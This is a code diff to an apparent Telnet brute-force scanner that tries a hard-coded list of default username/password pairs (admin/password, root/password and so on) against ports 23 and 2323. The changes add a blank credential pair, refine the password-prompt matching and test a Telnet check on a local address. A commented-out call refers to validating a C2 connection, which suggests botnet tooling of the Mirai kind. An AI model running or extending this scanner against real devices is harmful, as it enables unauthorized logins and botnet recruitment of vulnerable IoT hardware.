@@ -14,6 +14,7 @@ from colorama import init, Fore
 
 
 MAlist = [
+        ("",""),
         ("admin", "password"),
         ("root", "password"),
         ("admin", "admin"),
@@ -151,7 +152,7 @@ def bruteport(ip, port):    #try 23 & 2323
                     user, password = get_credentials(pindex)                # generate pair of account and password
                     tn.write((user + "\n").encode('ascii'))                 # send username to login account 
                     check_around+=1
-                elif "Password:" in str(response) or "password" in str(response):    
+                elif "Password:" in str(response) or "password:" in str(response):    
                     if asked_password_in_cnx and need_user:                 # if ask password before and need account then close connect 
                         tn.close()
                         break
@@ -290,7 +291,8 @@ def Scanner(choose):
 if __name__ == '__main__':
     print("[Scanner] Scanner process started ..")
     #validateC2() # Test to connect remote DB
-    Scanner(2)
+    #Scanner(2)
+    is_telent_open("192.168.0.1")
 
 
 ''' if you want to speed up 
